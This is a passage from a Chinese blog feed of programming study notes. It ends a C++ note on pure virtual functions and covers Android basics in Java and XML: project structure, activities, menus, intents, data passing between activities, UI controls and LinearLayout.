第二个（指向guaduate的）display将输出四个信息</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h4 id="纯虚函数"><a href="#纯虚函数" class="headerlink" title="纯虚函数"></a>纯虚函数</h4><p>纯虚函数一般用于定义抽象类，比如shape类型，派生出circle，rectangle，triangle。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">virtual</span> 函数类型 函数名（） = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//&quot;= 0 &quot;仅仅是标志性的，并不是值等于0，告知系统是一个纯虚函数</span></span><br></pre></td></tr></table></figure>











]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>基础语法</tag>
      </tags>
  </entry>
  <entry>
    <title>Android语法笔记(Java)</title>
    <url>/2021/11/06/android/</url>
    <content><![CDATA[<h2 id="Android笔记"><a href="#Android笔记" class="headerlink" title="Android笔记"></a>Android笔记</h2><span id="more"></span>

<ul>
<li><p>安装避坑：gradle无法同步成功（ Gradle sync failed: Cause: dl.google.com:443 failed to respond ）</p>
<p><a href="https://github.com/itgoyo/AndroidSummary/issues/59">https://github.com/itgoyo/AndroidSummary/issues/59</a></p>
</li>
</ul>
<h3 id="工程目录结构"><a href="#工程目录结构" class="headerlink" title="工程目录结构"></a>工程目录结构</h3><p>└── HelloWorld<br>    ├── app    项目代码，资源<br>    │   ├── build　编译自动生成<br>    │   ├── build.gradle<br>    │   ├── libs    项目中引用的第三方jar包<br>    │   ├── proguard-rules.pro　加密混淆，防逆向破解<br>    │   └── src　　资源目录<br>    ├── build.gradle　项目全局的gradle构架脚本<br>    ├── gradle　            gradle wrapper配置文件<br>    │   └── wrapper<br>    ├── gradle.properties        gradle  全局配置文件<br>    ├── gradlew<br>    ├── gradlew.bat<br>    ├── local.properties       指定本机中android sdk路径<br>    └── settings.gradle　　指定项目中所有引入的模块</p>
<p>资源目录src</p>
<p>├── androidTest　　　测试用例<br>│   └── java<br>│       └── com<br>├── main<br>│   ├── AndroidManifest.xml　　整个android项目配置文件<br>│   ├── java<br>│   │   └── com<br>│   └── res　　　　　　　　　　资源目录<br>│       ├── drawable　　　　　　放图片，drawable开头<br>│       ├── drawable-v24<br>│       ├── layout　　　　　　　布局文件<br>│       ├── mipmap-anydpi-v26 由mipmap开头的都是用来放图标的<br>│       ├── mipmap-hdpi<br>│       ├── mipmap-mdpi<br>│       ├── mipmap-xhdpi<br>│       ├── mipmap-xxhdpi<br>│       ├── mipmap-xxxhdpi<br>│       ├── values<br>│       └── values-night<br>└── test　　　用于Unit test<br>    └── java<br>        └── com</p>
<p>res目录中定义的xml文件可以在新的xml文件或者java代码中被引用</p>
<p>例如res下有一个　strings.xml　文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;app_name&quot;</span>&gt;</span>HelloWorldApplication<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>则在AndroidManifest.xml文件中作为顶栏应用名显示</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">android:label=&quot;@string/app_name&quot;</span><br></pre></td></tr></table></figure>

<p>而在代码中引用则用<code>R.String.app_name</code></p>
<h3 id="安卓的log"><a href="#安卓的log" class="headerlink" title="安卓的log"></a>安卓的log</h3><p>log.v() verbose</p>
<p>log.d() debug</p>
<p>log.i() info</p>
<p>log.w() warinning </p>
<p>log.e() error</p>
<p>直接类比输出语句，输出在logcat中</p>
<h2 id="activity"><a href="#activity" class="headerlink" title="activity"></a>activity</h2><p> 活动是一种可以包含用户界面的组件，用于和用户交互</p>
<ul>
<li><p>手动创建活动</p>
<ol>
<li><p>在app/src/main/java下创建一个新的活动firstActivity.java</p>
</li>
<li><p>/app/src/main/res下新建layout目录，并且在目录中新建一个布局，命名为firt_layout，在布局中新建按钮</p>
</li>
<li><p>在firstActivity.java的OnCreate重载函数中加载布局<code>setContentView(R.layout.first_layout)</code></p>
</li>
<li><p>在AndroidManifest.xml中注册为主活动</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">&quot;.firstActivity&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;this is firstactivaty&quot;</span>&gt;</span>　　<span class="comment">&lt;!--应用程序显示的名字        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 注册为主活动       --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--    注册为启动    --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>tips: ctrl + o　ＡＳ中触发函数重写模板</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//toast 使用方法</span></span><br><span class="line"><span class="comment">//param: context , text ,show_time</span></span><br><span class="line"><span class="comment">//context为toast显示的上下文，this表示当前的活动</span></span><br><span class="line"><span class="comment">//第三个参数表示toast显示的时长，有两个LENGTH_SHORT,LENGTH_LONG</span></span><br><span class="line">Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;toast显示的内容&quot;</span>, Toast.LENGTH_SHORT).show();</span><br></pre></td></tr></table></figure>



<h3 id="菜单使用方法"><a href="#菜单使用方法" class="headerlink" title="菜单使用方法"></a>菜单使用方法</h3><p>在res文件夹中创建menu目录，并且创建一个新的资源文件（main.xml）</p>
<p><code>@+id/test</code>是注册一个新的ｉｄ选项，可以被ｊａｖａ调用</p>
<p>R.id.test</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--   定义了菜单两个项目，add,remove     --&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">menu</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/add_item&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:title</span>=<span class="string">&quot;Add&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/remove_item&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:title</span>=<span class="string">&quot;Remove&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">menu</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//    创建菜单栏 /res/menu/main.xml</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</span><br><span class="line">        getMenuInflater().inflate(R.menu.main,menu);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    相应菜单选项触发的事件</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(<span class="meta">@NonNull</span> MenuItem item)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (item.getItemId()) &#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.add_item:</span><br><span class="line">                Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;you clicked add&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.remove_item:</span><br><span class="line">                Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;you click Remove&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>销毁活动只需一个函数<code>finsh()</code></p>
<h3 id="intent启动activity"><a href="#intent启动activity" class="headerlink" title="intent启动activity"></a>intent启动activity</h3><h4 id="显式调用"><a href="#显式调用" class="headerlink" title="显式调用"></a>显式调用</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//事先创建好的secondActivity.java</span></span><br><span class="line">Button button1 = (Button) findViewById(R.id.button1);</span><br><span class="line">        button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                <span class="comment">//  intent 显式调用</span></span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(firstActivity.<span class="keyword">this</span>,secondActivity.class);</span><br><span class="line">                startActivity(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>

<h4 id="隐式调用"><a href="#隐式调用" class="headerlink" title="隐式调用"></a>隐式调用</h4><p>为创建好的第二个活动注册</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.secondActivity&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.activitytest.ACTION_START&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在firstActivity.java中调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> Button button1 = (Button) findViewById(R.id.button1);</span><br><span class="line">        button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line"><span class="comment">//              intent　隐式掉用</span></span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(<span class="string">&quot;com.example.activitytest.ACTION_START&quot;</span>);</span><br><span class="line">                startActivity(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>使用隐式调用其他系统功能</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Button button1 = (Button) findViewById(R.id.button1);</span><br><span class="line">       button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">               <span class="comment">//拉起系统浏览器</span></span><br><span class="line">               Intent intent = <span class="keyword">new</span> Intent(Intent.ACTION_VIEW);</span><br><span class="line">               intent.setData(Uri.parse(<span class="string">&quot;http://www.baidu.com&quot;</span>));</span><br><span class="line">               <span class="comment">//拉起电话界面</span></span><br><span class="line">               Intent intent = <span class="keyword">new</span> Intent(Intent.ACTION_TEL);</span><br><span class="line">               intent.setData(Uri.parse(<span class="string">&quot;tel:10086&quot;</span>));</span><br><span class="line">               startActivity(intent);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="intent数据传递"><a href="#intent数据传递" class="headerlink" title="intent数据传递"></a>intent数据传递</h3><h4 id="向下一个活动传递"><a href="#向下一个活动传递" class="headerlink" title="向下一个活动传递"></a>向下一个活动传递</h4>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//fitstActivity.java</span></span><br><span class="line">Button button1 = (Button) findViewById(R.id.button1);</span><br><span class="line">        button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(firstActivity.<span class="keyword">this</span>,secondActivity.class);</span><br><span class="line">                intent.putExtra(<span class="string">&quot;extra_Data&quot;</span>,<span class="string">&quot;sent&quot;</span>);<span class="comment">//给intent加上额外的信息</span></span><br><span class="line">                startActivity(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//secondActivity.java   </span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_second);</span><br><span class="line">        Intent intent = getIntent();</span><br><span class="line">        String data = intent.getStringExtra(<span class="string">&quot;extra_Data&quot;</span>);<span class="comment">//因为传送消息是String所以getStringExtra,如果bool就getBooleanExtra</span></span><br><span class="line">        Log.d(<span class="string">&quot;secondActivity&quot;</span>  ,data );</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="向上一个活动传递"><a href="#向上一个活动传递" class="headerlink" title="向上一个活动传递"></a>向上一个活动传递</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//fitstActivity.java</span></span><br><span class="line"><span class="comment">//创建需要返回结果的活动</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.first_layout);</span><br><span class="line">        Button button1 = (Button) findViewById(R.id.button1);</span><br><span class="line">        button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(firstActivity.<span class="keyword">this</span>,secondActivity.class);</span><br><span class="line">                <span class="comment">//startActivityForResult函数：当启动的活动销毁时返回结果给上一个活动</span></span><br><span class="line">                startActivityForResult(intent,<span class="number">1</span>);<span class="comment">//这里的１是requestcode ,只要是个唯一值都可以</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//接受来自销毁活动的结果</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onActivityResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="keyword">int</span> resultCode, <span class="meta">@Nullable</span> Intent data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (requestCode)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span>(resultCode == RESULT_OK)&#123;</span><br><span class="line">                String returnData = data.getStringExtra(<span class="string">&quot;data_return&quot;</span>);<span class="comment">//接受来自销毁活动返回的字符串，放在returnData中</span></span><br><span class="line">                Log.d(<span class="string">&quot;firstActivity&quot;</span>, returnData);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//secondActivity.java</span></span><br><span class="line"> setContentView(R.layout.activity_second);</span><br><span class="line">        Button button2 = (Button) findViewById(R.id.button2);</span><br><span class="line">        button2.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                        <span class="comment">//构造一个新的intent用于回传，并且将结果的值置为RESULT_OK</span></span><br><span class="line">                        Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">                        intent.putExtra(<span class="string">&quot;data_return&quot;</span>,<span class="string">&quot;hello firstactivity&quot;</span>);</span><br><span class="line">                        setResult(RESULT_OK,intent) ;</span><br><span class="line">                        finish();<span class="comment">//销毁</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//对back键的情况进行处理，逻辑同OnClick</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onBackPressed</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// 不可以有默认创建的这个继承，会导致无效       super.onBackPressed();</span></span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">        intent.putExtra(<span class="string">&quot;data_return&quot;</span>,<span class="string">&quot;hello firstacticity&quot;</span>);</span><br><span class="line">        setResult(RESULT_OK,intent);</span><br><span class="line">        finish();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>





<h2 id="UI"><a href="#UI" class="headerlink" title="UI"></a>UI</h2><h3 id="控件"><a href="#控件" class="headerlink" title="控件"></a>控件</h3><p>在LinearLayout布局的情况下，只有android:orientation=”vertical”才可以不重叠的显示</p>
<ul>
<li><p>TextView</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:gravity</span>=<span class="string">&quot;center&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textSize</span>=<span class="string">&quot;24sp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textColor</span>=<span class="string">&quot;#00ff00&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;this is Text view&quot;</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li><p>Button</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:id</span>=<span class="string">&quot;@+id/button&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:text</span>=<span class="string">&quot;Button&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:textAllCaps</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">       /&gt;</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure></li>
<li><p>EditText</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/edit_text&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:hint</span>=<span class="string">&quot;type atuoa&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:maxLines</span>=<span class="string">&quot;2&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>hint指的是未输入文字之前的提示</p>
<p>maxline表示的是最大显示的行数</p>
</li>
<li><p>ImageView</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">   <span class="attr">android:id</span>=<span class="string">&quot;@+id/image_view&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">android:src</span>=<span class="string">&quot;@drawable/img_1&quot;</span></span></span><br><span class="line"><span class="tag">           /&gt;</span></span><br></pre></td></tr></table></figure>

<p>src为资源目录下的图片</p>
</li>
<li><p>ProgressBar</p>
<p>转圈圈进度条</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ProgressBar</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:id</span>=<span class="string">&quot;@+id/progress_bar&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">  /&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义一个状态栏</span></span><br><span class="line">ProgressBar progress_bar = (ProgressBar)findViewById(R.id.progress_bar);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//visible可见  gone消失   invisible不可见</span></span><br><span class="line"><span class="comment">//get visibility</span></span><br><span class="line">progress_bar.getVisibility() == View.VISIBLE</span><br><span class="line"><span class="comment">//set gone</span></span><br><span class="line">    progress_bar.setVisibility(View.GONE);</span><br><span class="line"><span class="comment">//set visible</span></span><br><span class="line">    progress_bar.setVisibility(View.VISIBLE);</span><br></pre></td></tr></table></figure>

<p>水平进度条</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ProgressBar</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:id</span>=<span class="string">&quot;@+id/progress_bar&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">style</span>=<span class="string">&quot;?android:attr/progressBarStyleHorizontal&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:max</span>=<span class="string">&quot;100&quot;</span></span></span><br><span class="line"><span class="tag">  /&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置进度条的值</span></span><br><span class="line"><span class="keyword">int</span> progerss = progressBar.getProgress();</span><br><span class="line">progeress = Progress +<span class="number">10</span> ;</span><br><span class="line">progressBar.setProgress(progress);</span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li><p>AlertDialog</p>
<p>点击按钮弹出对话框</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">       <span class="meta">@Override</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">           AlertDialog.Builder dialog = <span class="keyword">new</span> AlertDialog.Builder(MainActivity.<span class="keyword">this</span>);</span><br><span class="line">           dialog.setTitle(<span class="string">&quot;this is dialog&quot;</span>);</span><br><span class="line">           dialog.setMessage(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">           dialog.setCancelable(<span class="keyword">false</span>);</span><br><span class="line">           dialog.setPositiveButton(<span class="string">&quot;ok&quot;</span>, <span class="keyword">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class="line">               <span class="meta">@Override</span></span><br><span class="line">               <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">               &#125;</span><br><span class="line">           &#125;);</span><br><span class="line">           dialog.setNegativeButton(<span class="string">&quot;cancel&quot;</span>, <span class="keyword">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class="line">               <span class="meta">@Override</span></span><br><span class="line">               <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">               &#125;</span><br><span class="line">           &#125;);</span><br><span class="line">           dialog.show();</span><br><span class="line">  </span><br><span class="line">       &#125;</span><br><span class="line">   &#125;);</span><br></pre></td></tr></table></figure></li>
<li><p>ProgressDialog</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ProgressDialog progressDialog = <span class="keyword">new</span> ProgressDialog(MainActivity.<span class="keyword">this</span>);</span><br><span class="line">                progressDialog.setTitle(<span class="string">&quot;this is progressdialog&quot;</span>);</span><br><span class="line">                progressDialog.setMessage(<span class="string">&quot;loading..&quot;</span>);</span><br><span class="line">                progressDialog.setCancelable(<span class="keyword">true</span>);</span><br><span class="line">                progressDialog.show();</span><br><span class="line"><span class="comment">//大致和对话框相同</span></span><br><span class="line"><span class="comment">//当Setcancelable为假时，不能通过back取消，在调用完之后使用dismiss()来关闭对话框</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="四种布局"><a href="#四种布局" class="headerlink" title="四种布局"></a>四种布局</h3><h4 id="LinearLayout"><a href="#LinearLayout" class="headerlink" title="LinearLayout"></a>LinearLayout</h4><p>edittext自适应,button仅包裹文字</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:id</span>=<span class="string">&quot;@+id/edit_text&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_width</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_weight</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:hint</span>=<span class="string">&quot;type atuoa&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:id</span>=<span class="string">&quot;@+id/button&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_width</span>=<span class="string">&quot;warp_content&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:text</span>=<span class="string">&quot;Button&quot;</span></span></span><br><span class="line"><span class="tag">       /&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>edittext:button = 3:2比例布局</p>
